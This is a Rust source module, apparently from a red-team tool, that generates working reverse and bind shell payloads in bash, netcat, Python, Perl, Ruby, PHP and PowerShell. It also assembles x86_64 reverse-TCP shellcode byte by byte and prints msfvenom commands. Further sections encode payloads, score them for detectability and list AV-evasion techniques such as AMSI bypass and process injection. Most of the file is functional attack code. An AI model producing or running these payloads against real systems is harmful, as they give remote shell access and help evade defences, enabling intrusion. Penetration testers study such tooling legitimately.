//! Payload generation — reverse shells, bind shells, encoded payloads,
//! and stager construction. Pure-Rust implementations for red team operations.

use std::fmt;
use std::fmt::Write as _;

// ─── Shell Payload Types ─────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShellType {
    ReverseTcp,
    ReverseHttp,
    ReverseHttps,
    BindTcp,
    ReverseBash,
    ReversePython,
    ReversePerl,
    ReverseRuby,
    ReversePhp,
    ReverseNetcat,
    MeterpreterReverseTcp,
    PowerShellMsf,
}

impl fmt::Display for ShellType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ReverseTcp => write!(f, "Reverse TCP Shell"),
            Self::ReverseHttp => write!(f, "Reverse HTTP Shell"),
            Self::ReverseHttps => write!(f, "Reverse HTTPS Shell"),
            Self::BindTcp => write!(f, "Bind TCP Shell"),
            Self::ReverseBash => write!(f, "Reverse Bash Shell"),
            Self::ReversePython => write!(f, "Reverse Python Shell"),
            Self::ReversePerl => write!(f, "Reverse Perl Shell"),
            Self::ReverseRuby => write!(f, "Reverse Ruby Shell"),
            Self::ReversePhp => write!(f, "Reverse PHP Shell"),
            Self::ReverseNetcat => write!(f, "Reverse Netcat Shell"),
            Self::MeterpreterReverseTcp => write!(f, "Meterpreter Reverse TCP"),
            Self::PowerShellMsf => write!(f, "PowerShell Reverse Shell"),
        }
    }
}

impl ShellType {
    /// Every shell type with its CLI aliases, target platform, and a
    /// plain-language description — the single source of truth behind both
    /// `--gen-shell --list` and the `--guide` output.
    #[must_use]
    pub const fn catalog() -> &'static [ShellTypeEntry] {
        &[
            ShellTypeEntry {
                shell_type: Self::ReverseBash,
                aliases: &["bash", "sh"],
                platform: "Linux / Unix",
                description: "One-line bash reverse shell using /dev/tcp. Best when bash is present (almost always on Linux).",
            },
            ShellTypeEntry {
                shell_type: Self::ReverseNetcat,
                aliases: &["netcat", "nc"],
                platform: "Linux / Unix (nc with -e support or ncat)",
                description: "Reverse shell via netcat + named pipe. Reliable on many distros, but some nc builds lack -e.",
            },
            ShellTypeEntry {
                shell_type: Self::ReversePython,
                aliases: &["python", "python3", "py"],
                platform: "Linux / Unix / Windows (with python3)",
                description: "Reverse shell via python3's socket + os.dup2. Broad compatibility; often present on modern systems.",
            },
            ShellTypeEntry {
                shell_type: Self::ReversePerl,
                aliases: &["perl"],
                platform: "Linux / Unix",
                description: "Reverse shell via perl's Socket module. Useful when perl is present but bash is restricted.",
            },
            ShellTypeEntry {
                shell_type: Self::ReverseRuby,
                aliases: &["ruby"],
                platform: "Linux / Unix",
                description: "Reverse shell via ruby -rsocket. Handy on systems with a Ruby toolchain installed.",
            },
            ShellTypeEntry {
                shell_type: Self::ReversePhp,
                aliases: &["php"],
                platform: "Linux / Unix (php-cli)",
                description: "Reverse shell via php's fsockopen. Good on web hosts that ship php-cli.",
            },
            ShellTypeEntry {
                shell_type: Self::ReverseTcp,
                aliases: &["tcp"],
                platform: "Linux x86_64",
                description: "Raw x86_64 reverse TCP shellcode (syscall-based). Use where a compiled stub is preferred.",
            },
            ShellTypeEntry {
                shell_type: Self::PowerShellMsf,
                aliases: &["powershell", "ps", "ps1"],
                platform: "Windows (PowerShell 2.0+)",
                description: "One-liner PowerShell reverse shell (plain TCP client + process launch). No external tools required.",
            },
            ShellTypeEntry {
                shell_type: Self::BindTcp,
                aliases: &["bind", "bindtcp"],
                platform: "Linux / Unix (nc with -e support or ncat)",
                description: "Bind shell: the target listens and you connect to it. Only works when you can reach the target directly.",
            },
            ShellTypeEntry {
                shell_type: Self::MeterpreterReverseTcp,
                aliases: &["meterpreter", "msf"],
                platform: "Windows / Linux (requires Metasploit)",
                description: "Meterpreter reverse TCP stage. Requires the local msfvenom binary — prints the exact command.",
            },
            ShellTypeEntry {
                shell_type: Self::ReverseHttp,
                aliases: &["http"],
                platform: "Windows / Linux (requires Metasploit)",
                description: "Meterpreter reverse HTTP stager. Requires the local msfvenom binary — prints the exact command.",
            },
            ShellTypeEntry {
                shell_type: Self::ReverseHttps,
                aliases: &["https"],
                platform: "Windows / Linux (requires Metasploit)",
                description: "Meterpreter reverse HTTPS stager. Requires the local msfvenom binary — prints the exact command.",
            },
        ]
    }

    /// Resolve a user-supplied type name (e.g. `"bash"`, `"py"`) to a
    /// [`ShellType`], or `None` when the name matches no alias.
    #[must_use]
    pub fn parse(name: &str) -> Option<Self> {
        let normalized = name.trim().to_ascii_lowercase();
        Self::catalog()
            .iter()
            .find(|entry| entry.aliases.iter().any(|alias| *alias == normalized))
            .map(|entry| entry.shell_type)
    }
}

/// One entry in the shell-type catalog (see [`ShellType::catalog`]).
#[derive(Debug, Clone, Copy)]
pub struct ShellTypeEntry {
    pub shell_type: ShellType,
    /// CLI aliases accepted by `--gen-shell <type>` (first is canonical).
    pub aliases: &'static [&'static str],
    /// Target platform the payload is intended for.
    pub platform: &'static str,
    /// Plain-language description of the payload and when to use it.
    pub description: &'static str,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PayloadEncoding {
    None,
    Hex,
    UrlEncoding,
    Base64,
    UnicodeEscape,
    Xor(u8),
}

// ─── Generated Payload ───────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct GeneratedPayload {
    pub shell_type: ShellType,
    pub payload: String,
    pub encoded_payload: String,
    pub encoding: PayloadEncoding,
    pub lhost: String,
    pub lport: u16,
    pub length: usize,
}

impl fmt::Display for GeneratedPayload {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "Payload Generation")?;
        writeln!(f, "==================")?;
        writeln!(f, "Type      : {}", self.shell_type)?;
        writeln!(f, "LHOST     : {}", self.lhost)?;
        writeln!(f, "LPORT     : {}", self.lport)?;
        writeln!(f, "Length    : {} bytes", self.length)?;
        writeln!(f, "Encoding  : {:?}", self.encoding)?;
        writeln!(f)?;
        writeln!(f, "─── Raw Payload ───")?;
        writeln!(f, "{}", self.payload)?;
        if self.encoding != PayloadEncoding::None {
            writeln!(f)?;
            writeln!(f, "─── Encoded Payload ───")?;
            writeln!(f, "{}", self.encoded_payload)?;
        }
        Ok(())
    }
}

// ─── Shell Generation ────────────────────────────────────────────────────────

/// Returns `true` when `lhost` is a dotted-quad IPv4 address (e.g.
/// `192.168.1.7`). Raw-shellcode payloads embed the address as four literal
/// bytes, so they require a numeric IPv4 rather than a hostname.
#[must_use]
pub fn is_valid_ipv4(lhost: &str) -> bool {
    reverse_tcp_shellcode(lhost, 0).is_some()
}

/// Builds a Linux `x86_64` reverse-TCP shellcode stub that connects back to
/// `lhost`:`lport` and spawns `/bin/sh` over the socket. The address and port
/// are embedded directly into the instruction stream (metasploit-style
/// `x64/shell_reverse_tcp`), so `lhost` must be a dotted-quad IPv4 address —
/// returns `None` otherwise.
///
/// Stub outline: `socket(AF_INET, SOCK_STREAM, 0)` → `connect(fd, sockaddr_in{
/// AF_INET, port(BE), ip(NBO) }, 16)` → `dup2(fd, {2,1,0})` → `execve("/bin/sh")`.
fn reverse_tcp_shellcode(lhost: &str, lport: u16) -> Option<String> {
    let octets: Vec<&str> = lhost.split('.').collect();
    if octets.len() != 4 {
        return None;
    }
    let mut ip = [0_u8; 4];
    for (index, octet) in octets.iter().enumerate() {
        let value: u8 = octet.parse().ok()?;
        ip[index] = value;
    }

    // 8-byte sockaddr pushed on the stack, memory order:
    //   family (2) | port (big-endian) | address (network byte order)
    // The immediate for `mov rcx, imm64` is little-endian, so each byte lands
    // at its byte position shifted by 8 * index.
    let sockaddr = 0x02_u64
        | (u64::from(lport >> 8) << 16)
        | (u64::from(lport & 0xff) << 24)
        | (u64::from(ip[0]) << 32)
        | (u64::from(ip[1]) << 40)
        | (u64::from(ip[2]) << 48)
        | (u64::from(ip[3]) << 56);

    let mut bytes: Vec<u8> = vec![
        0x6a, 0x29, // push 0x29 (__NR_socket)
        0x58, // pop rax
        0x6a, 0x02, 0x5f, // push AF_INET; pop rdi
        0x6a, 0x01, 0x5e, // push SOCK_STREAM; pop rsi
        0x99, // cdq (protocol = 0)
        0x0f, 0x05, // syscall socket(2, 1, 0)
        0x48, 0x97, // xchg rdi, rax  (fd)
        0x48, 0xb9, // mov rcx, imm64
    ];
    bytes.extend_from_slice(&sockaddr.to_le_bytes());
    bytes.extend_from_slice(&[
        0x51, // push rcx (sockaddr*)
        0x48, 0x89, 0xe6, // mov rsi, rsp
        0x6a, 0x10, // push 16
        0x5a, // pop rdx (addrlen)
        0x6a, 0x2a, 0x58, // push __NR_connect; pop rax
        0x0f, 0x05, // syscall connect(fd, addr, 16)
        0x6a, 0x03, 0x5e, // push 3; pop rsi
        0x48, 0xff, 0xce, // dec rsi (2, then 1, then 0)
        0x6a, 0x21, 0x58, // push __NR_dup2; pop rax
        0x0f, 0x05, // syscall dup2(fd, rsi)
        0x75, 0xf6, // jne -10 (loop while dup2 succeeds)
        0x6a, 0x3b, 0x58, // push __NR_execve; pop rax
        0x99, // cdq (argv terminator)
        0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // rbx = "/bin/sh\0"
        0x53, // push rbx
        0x48, 0x89, 0xe7, // mov rdi, rsp
        0x52, // push rdx (NULL)
        0x57, // push rdi
        0x48, 0x89, 0xe6, // mov rsi, rsp
        0x0f, 0x05, // syscall execve("/bin/sh", ["/bin/sh"], NULL)
    ]);

    Some(bytes.iter().fold(String::new(), |mut acc, byte| {
        let _ = write!(acc, "\\x{byte:02x}");
        acc
    }))
}

/// Generate a reverse shell payload for the given shell type.
#[must_use]
pub fn generate_reverse_shell(shell_type: ShellType, lhost: &str, lport: u16) -> GeneratedPayload {
    let payload = match shell_type {
        ShellType::ReverseBash => format!("bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
        ShellType::ReverseNetcat => {
            format!("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f")
        }
        ShellType::ReversePython => format!(
            "python3 -c 'import socket,subprocess,os;\\
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\\
s.connect((\"{lhost}\",{lport}));\\
os.dup2(s.fileno(),0);\\
os.dup2(s.fileno(),1);\\
os.dup2(s.fileno(),2);\\
subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        ShellType::ReversePerl => format!(
            "perl -e 'use Socket;\\
$i=\"{lhost}\";\\
$p={lport};\\
socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\\
if(connect(S,sockaddr_in($p,inet_aton($i)))){{\\
open(STDIN,\">&S\");\\
open(STDOUT,\">&S\");\\
open(STDERR,\">&S\");\\
exec(\"/bin/sh -i\")}}'"
        ),
        ShellType::ReverseRuby => format!(
            "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;\\
exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
        ShellType::ReversePhp => format!(
            "php -r '$sock=fsockopen(\"{lhost}\",{lport});\\
exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        ShellType::ReverseTcp => {
            // Linux x86_64 reverse TCP shellcode (metasploit-compatible) with
            // the requested address and port embedded. A numeric IPv4 is
            // required; callers validate up front, so this arm only fires as
            // a defensive fallback that never silently drops the endpoint.
            reverse_tcp_shellcode(lhost, lport).unwrap_or_else(|| {
                format!("[error: tcp shellcode requires a numeric IPv4 lhost; got {lhost}]")
            })
        }
        ShellType::ReverseHttp | ShellType::ReverseHttps => {
            format!(
                "[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -f exe]"
            )
        }
        ShellType::MeterpreterReverseTcp => {
            format!(
                "[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f ps1]"
            )
        }
        ShellType::PowerShellMsf => {
            // Real, dependency-free PowerShell reverse shell (PS 2.0+).
            // Uses the built-in TcpClient + ProcessStartInfo: no DownloadString,
            // no IEX, no external binaries — just a socket and a spawned process.
            format!(
                "$c=New-Object Net.Sockets.TcpClient('{lhost}',{lport});$s=$c.GetStream();\
                 [byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0)\
                 {{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);\
                 try{{$o=iex $d 2>&1|Out-String}}catch{{$o=$_.Exception.Message}}\
                 ;$s.Write((New-Object Text.ASCIIEncoding).GetBytes($o),0,$o.Length)}}"
            )
        }
        ShellType::BindTcp => {
            format!("nc -lvp {lport} -e /bin/sh")
        }
    };

    let payload_len = payload.len();
    let encoded = encode_payload(&payload, PayloadEncoding::Base64);

    GeneratedPayload {
        shell_type,
        payload,
        encoded_payload: encoded,
        encoding: PayloadEncoding::Base64,
        lhost: lhost.to_string(),
        lport,
        length: payload_len,
    }
}

// ─── Encoding Functions ──────────────────────────────────────────────────────

/// Encode a payload with the specified encoding.
#[must_use]
pub fn encode_payload(payload: &str, encoding: PayloadEncoding) -> String {
    match encoding {
        PayloadEncoding::None => payload.to_string(),
        PayloadEncoding::Hex => encode_hex(payload),
        PayloadEncoding::UrlEncoding => url_encode(payload),
        PayloadEncoding::Base64 => base64_encode(payload),
        PayloadEncoding::UnicodeEscape => unicode_escape(payload),
        PayloadEncoding::Xor(key) => xor_encode(payload, key),
    }
}

fn encode_hex(payload: &str) -> String {
    use std::fmt::Write as _;
    payload
        .bytes()
        .fold(String::with_capacity(payload.len() * 4), |mut s, b| {
            let _ = write!(s, "\\x{b:02x}");
            s
        })
}

fn url_encode(payload: &str) -> String {
    payload
        .bytes()
        .map(|b| match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                (b as char).to_string()
            }
            _ => format!("%{b:02x}"),
        })
        .collect()
}

fn base64_encode(payload: &str) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let bytes = payload.as_bytes();
    let mut result = String::new();

    for chunk in bytes.chunks(3) {
        let b0 = u32::from(chunk[0]);
        let b1 = if chunk.len() > 1 {
            u32::from(chunk[1])
        } else {
            0
        };
        let b2 = if chunk.len() > 2 {
            u32::from(chunk[2])
        } else {
            0
        };

        let triple = (b0 << 16) | (b1 << 8) | b2;

        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            result.push(CHARS[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        if chunk.len() > 2 {
            result.push(CHARS[(triple & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }

    result
}

fn unicode_escape(payload: &str) -> String {
    use std::fmt::Write as _;
    payload
        .bytes()
        .fold(String::with_capacity(payload.len() * 6), |mut s, b| {
            let _ = write!(s, "\\u{:04x}", u16::from(b));
            s
        })
}

fn xor_encode(payload: &str, key: u8) -> String {
    use std::fmt::Write as _;
    payload
        .bytes()
        .fold(String::with_capacity(payload.len() * 4), |mut s, b| {
            let _ = write!(s, "\\x{:02x}", b ^ key);
            s
        })
}

// ─── Payload Analysis ────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct PayloadAnalysis {
    pub original: String,
    pub length: usize,
    pub null_bytes: usize,
    pub printable_ratio: f64,
    pub entropy: f64,
    pub shellcode_score: f32,
    pub detections: Vec<String>,
}

impl fmt::Display for PayloadAnalysis {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "Payload Analysis")?;
        writeln!(f, "================")?;
        writeln!(f, "Length       : {} bytes", self.length)?;
        writeln!(f, "Null bytes   : {}", self.null_bytes)?;
        writeln!(f, "Printable %  : {:.1}%", self.printable_ratio * 100.0)?;
        writeln!(f, "Entropy      : {:.2}", self.entropy)?;
        writeln!(f, "Shellcode    : {:.0}%", self.shellcode_score * 100.0)?;
        if !self.detections.is_empty() {
            writeln!(f, "Detections")?;
            for d in &self.detections {
                writeln!(f, "  ⚠ {d}")?;
            }
        }
        Ok(())
    }
}

/// Analyze a payload for characteristics that AV/EDR may flag.
#[must_use]
#[allow(clippy::cast_precision_loss)]
pub fn analyze_payload(payload: &str) -> PayloadAnalysis {
    let bytes = payload.as_bytes();
    let length = bytes.len();
    let null_bytes = bytes
        .iter()
        .fold(0usize, |acc, &b| acc + usize::from(b == 0));
    let printable = bytes
        .iter()
        .filter(|&&b| (0x20..=0x7E).contains(&b))
        .count();
    let printable_ratio = if length > 0 {
        printable as f64 / length as f64
    } else {
        0.0
    };

    // Shannon entropy
    let mut freq = [0u64; 256];
    for &b in bytes {
        freq[b as usize] += 1;
    }
    let entropy: f64 = freq
        .iter()
        .filter(|&&f| f > 0)
        .map(|&f| {
            let p = f as f64 / length as f64;
            -p * p.log2()
        })
        .sum();

    // Shellcode heuristics
    let mut shellcode_score = 0.0f32;

    // Common shellcode patterns (NOP sled, syscalls, etc.)
    let shellcode_signatures: &[(&[u8], f32, &str)] = &[
        (&[0x90, 0x90, 0x90, 0x90], 0.3, "NOP sled detected"),
        (&[0xcd, 0x80], 0.4, "Linux int 0x80 syscall"),
        (&[0x0f, 0x05], 0.4, "Linux x86_64 syscall (0x0f05)"),
        (&[0xcc], 0.2, "INT3 breakpoint (debug trap)"),
        (&[0xc3], 0.1, "RET instruction"),
        (b"/bin/sh", 0.5, "Shell spawn string"),
        (b"/bin/bash", 0.5, "Bash spawn string"),
        (b"cmd.exe", 0.5, "Windows cmd.exe reference"),
        (b"powershell", 0.3, "PowerShell reference"),
    ];

    let mut detections = Vec::new();

    for &(sig, score, desc) in shellcode_signatures {
        if bytes.windows(sig.len()).any(|w| w == sig) {
            shellcode_score += score;
            detections.push(desc.to_string());
        }
    }

    // High entropy may indicate encryption/encoding
    if entropy > 7.5 {
        shellcode_score += 0.2;
        detections.push("High entropy — possible encrypted/encoded payload".to_string());
    }

    // Null bytes in non-trailing positions are suspicious
    let non_trailing_nulls = bytes[..length.saturating_sub(4)]
        .iter()
        .fold(0usize, |acc, &b| acc + usize::from(b == 0));
    if non_trailing_nulls > 0 {
        shellcode_score += 0.1;
        detections.push(format!("{non_trailing_nulls} null bytes in payload body"));
    }

    // Printable ratio below 50% suggests binary/shellcode
    if printable_ratio < 0.5 && length > 10 {
        shellcode_score += 0.2;
        detections.push("Low printable ratio — likely binary/shellcode".to_string());
    }

    shellcode_score = shellcode_score.min(1.0);

    PayloadAnalysis {
        original: payload.to_string(),
        length,
        null_bytes,
        printable_ratio,
        entropy,
        shellcode_score,
        detections,
    }
}

// ─── AV Evasion Suggestions ──────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct EvasionSuggestion {
    pub technique: String,
    pub description: String,
    pub effectiveness: String,
    pub example: String,
}

impl fmt::Display for EvasionSuggestion {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "Technique: {}", self.technique)?;
        writeln!(f, "Effectiveness: {}", self.effectiveness)?;
        writeln!(f, "{}", self.description)?;
        writeln!(f, "Example: {}", self.example)?;
        Ok(())
    }
}

/// Generate AV evasion suggestions based on payload analysis.
#[must_use]
pub fn suggest_evasion(analysis: &PayloadAnalysis) -> Vec<EvasionSuggestion> {
    let mut suggestions = Vec::new();

    if analysis.null_bytes > 0 {
        suggestions.push(EvasionSuggestion {
            technique: "Null byte removal".into(),
            description: "Replace null bytes with equivalent register zeroing or use position-independent code".into(),
            effectiveness: "Medium".into(),
            example: "mov eax, 0 instead of null-padded strings".into(),
        });
    }

    if analysis.entropy < 4.0 && analysis.shellcode_score > 0.3 {
        suggestions.push(EvasionSuggestion {
            technique: "Polymorphic encoding".into(),
            description: "Use a polymorphic encoder to generate unique payload variants each time"
                .into(),
            effectiveness: "High".into(),
            example: "shikata_ga_nai (SGN) — XOR-based polymorphic encoder".into(),
        });
    }

    suggestions.push(EvasionSuggestion {
        technique: "Process injection".into(),
        description: "Inject payload into a legitimate process to evade memory-based detection"
            .into(),
        effectiveness: "High".into(),
        example: "Process hollowing, APC injection, thread execution hijacking".into(),
    });

    suggestions.push(EvasionSuggestion {
        technique: "AMSI bypass".into(),
        description: "Bypass Antimalware Scan Interface for PowerShell and .NET payloads".into(),
        effectiveness: "Medium-High".into(),
        example: "[Runtime.InteropServices.Marshal]::Copy(...) hook replacement".into(),
    });

    suggestions.push(EvasionSuggestion {
        technique: "Payload encryption".into(),
        description: "Encrypt the payload and decrypt in memory at runtime".into(),
        effectiveness: "High".into(),
        example: "AES-256-CBC encryption with XOR key derivation".into(),
    });

    if analysis.length > 200 {
        suggestions.push(EvasionSuggestion {
            technique: "Stage separation".into(),
            description: "Split the payload into a small stager and a larger staged payload downloaded at runtime".into(),
            effectiveness: "High".into(),
            example: "stager: download stage via HTTP; stage: full implant".into(),
        });
    }

    suggestions
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base64_encode() {
        let encoded = base64_encode("Hello, World!");
        assert_eq!(encoded, "SGVsbG8sIFdvcmxkIQ==");
    }

    #[test]
    fn test_hex_encode() {
        let encoded = encode_hex("AB");
        assert_eq!(encoded, r"\x41\x42");
    }

    #[test]
    fn test_url_encode() {
        let encoded = url_encode("a b");
        assert_eq!(encoded, "a%20b");
    }

    #[test]
    fn test_xor_encode() {
        let encoded = xor_encode("A", 0xFF);
        assert_eq!(encoded, r"\xbe");
    }

    #[test]
    fn test_analyze_shellcode() {
        let analysis = analyze_payload(r"\x90\x90\x90\x90/bin/sh");
        assert!(analysis.shellcode_score > 0.0);
    }

    #[test]
    fn test_generate_reverse_bash() {
        let payload = generate_reverse_shell(ShellType::ReverseBash, "10.0.0.1", 4444);
        assert_eq!(payload.lhost, "10.0.0.1");
        assert_eq!(payload.lport, 4444);
        assert!(payload.payload.contains("10.0.0.1"));
    }

    #[test]
    fn test_generate_powershell_reverse() {
        let payload = generate_reverse_shell(ShellType::PowerShellMsf, "10.0.0.1", 4444);
        assert!(payload.payload.contains("TcpClient"));
        assert!(payload.payload.contains("10.0.0.1"));
        assert!(payload.payload.contains("4444"));
        assert!(!payload.payload.contains("msfvenom"));
    }

    #[test]
    fn test_generate_bind_tcp() {
        let payload = generate_reverse_shell(ShellType::BindTcp, "10.0.0.1", 4444);
        assert!(payload.payload.contains("nc -lvp 4444"));
    }

    #[test]
    fn test_generate_reverse_tcp_embeds_endpoint() {
        // 192.168.1.7:4444 → port bytes 11 5c (BE), address bytes c0 a8 01 07.
        let payload = generate_reverse_shell(ShellType::ReverseTcp, "192.168.1.7", 4444);
        assert!(
            payload
                .payload
                .contains("\\x48\\xb9\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x07"),
            "shellcode must embed the sockaddr (family, port BE, address NBO): {}",
            payload.payload
        );
        // The stub must actually connect back and spawn a shell.
        assert!(payload.payload.contains("\\x6a\\x2a"), "connect syscall");
        assert!(payload.payload.contains("\\x6a\\x3b"), "execve syscall");
    }

    #[test]
    fn test_generate_reverse_tcp_different_endpoint_differs() {
        let first = generate_reverse_shell(ShellType::ReverseTcp, "10.0.0.1", 9999).payload;
        let second = generate_reverse_shell(ShellType::ReverseTcp, "10.0.0.2", 4444).payload;
        assert_ne!(first, second, "payload must vary with lhost and lport");
        assert!(first.contains("\\x27\\x0f"), "9999 = 0x270f (BE)");
        assert!(
            !first.contains("\\x11\\x5c"),
            "must not contain 4444 = 0x115c"
        );
    }

    #[test]
    fn test_generate_reverse_tcp_invalid_lhost_is_loud_not_silent() {
        let payload = generate_reverse_shell(ShellType::ReverseTcp, "myhost.example", 4444);
        assert!(
            payload
                .payload
                .contains("[error: tcp shellcode requires a numeric IPv4 lhost"),
            "invalid lhost must produce a diagnostic, not a silent broken stub"
        );
    }

    #[test]
    fn test_is_valid_ipv4() {
        assert!(is_valid_ipv4("192.168.1.7"));
        assert!(is_valid_ipv4("0.0.0.0"));
        assert!(is_valid_ipv4("255.255.255.255"));
        assert!(!is_valid_ipv4("myhost.example"));
        assert!(!is_valid_ipv4("192.168.1"));
        assert!(!is_valid_ipv4("192.168.1.999"));
        assert!(!is_valid_ipv4(""));
    }

    #[test]
    fn test_shell_type_parse_aliases() {
        assert_eq!(ShellType::parse("bash"), Some(ShellType::ReverseBash));
        assert_eq!(ShellType::parse("sh"), Some(ShellType::ReverseBash));
        assert_eq!(ShellType::parse("python3"), Some(ShellType::ReversePython));
        assert_eq!(ShellType::parse("nc"), Some(ShellType::ReverseNetcat));
        assert_eq!(
            ShellType::parse("powershell"),
            Some(ShellType::PowerShellMsf)
        );
        assert_eq!(ShellType::parse("bind"), Some(ShellType::BindTcp));
        assert_eq!(
            ShellType::parse("meterpreter"),
            Some(ShellType::MeterpreterReverseTcp)
        );
        assert_eq!(ShellType::parse("http"), Some(ShellType::ReverseHttp));
        assert_eq!(ShellType::parse("https"), Some(ShellType::ReverseHttps));
        assert_eq!(ShellType::parse("BASH"), Some(ShellType::ReverseBash));
        assert_eq!(ShellType::parse("nope-not-a-shell"), None);
    }

    #[test]
    fn test_shell_type_catalog_has_all_variants() {
        let mut seen: Vec<ShellType> = ShellType::catalog()
            .iter()
            .map(|entry| entry.shell_type)
            .collect();
        assert_eq!(seen.len(), 12, "every ShellType variant must be cataloged");
        seen.sort_by_key(|st| format!("{st:?}"));
        seen.dedup();
        assert_eq!(seen.len(), 12, "catalog must not repeat variants");
    }

    #[test]
    fn test_shell_type_catalog_entries_are_complete() {
        for entry in ShellType::catalog() {
            assert!(!entry.aliases.is_empty(), "each entry needs aliases");
            assert!(!entry.platform.is_empty(), "each entry needs a platform");
            assert!(
                !entry.description.is_empty(),
                "each entry needs a description"
            );
        }
    }

    #[test]
    fn test_evasion_suggestions() {
        let analysis = analyze_payload("test\x00payload");
        let suggestions = suggest_evasion(&analysis);
        assert!(!suggestions.is_empty());
    }
}
